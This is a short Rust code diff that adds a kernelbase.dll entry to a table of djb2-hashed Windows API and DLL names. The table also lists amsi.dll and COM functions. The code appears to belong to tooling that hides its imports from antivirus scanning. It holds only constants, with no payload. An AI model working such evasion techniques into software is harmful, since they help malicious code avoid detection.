@@ -63,8 +63,9 @@ pub mod h {
     pub const CO_INIT_EX:     u32 = djb2_hash(b"CoInitializeEx");
     pub const CO_CREATE_INST: u32 = djb2_hash(b"CoCreateInstance");
     // DLL name hashes — use h::DLL_* instead of djb2_hash_lower(b"xxx") in non-const callers
-    pub const DLL_NTDLL:   u32 = djb2_hash_lower(b"ntdll.dll");
-    pub const DLL_K32:     u32 = djb2_hash_lower(b"kernel32.dll");
+    pub const DLL_NTDLL:      u32 = djb2_hash_lower(b"ntdll.dll");
+    pub const DLL_K32:        u32 = djb2_hash_lower(b"kernel32.dll");
+    pub const DLL_KERNELBASE: u32 = djb2_hash_lower(b"kernelbase.dll");
     pub const DLL_OLE32:   u32 = djb2_hash_lower(b"ole32.dll");
     pub const DLL_AMSI:    u32 = djb2_hash_lower(b"amsi.dll");
     pub const DLL_VERSION: u32 = djb2_hash_lower(b"version.dll");
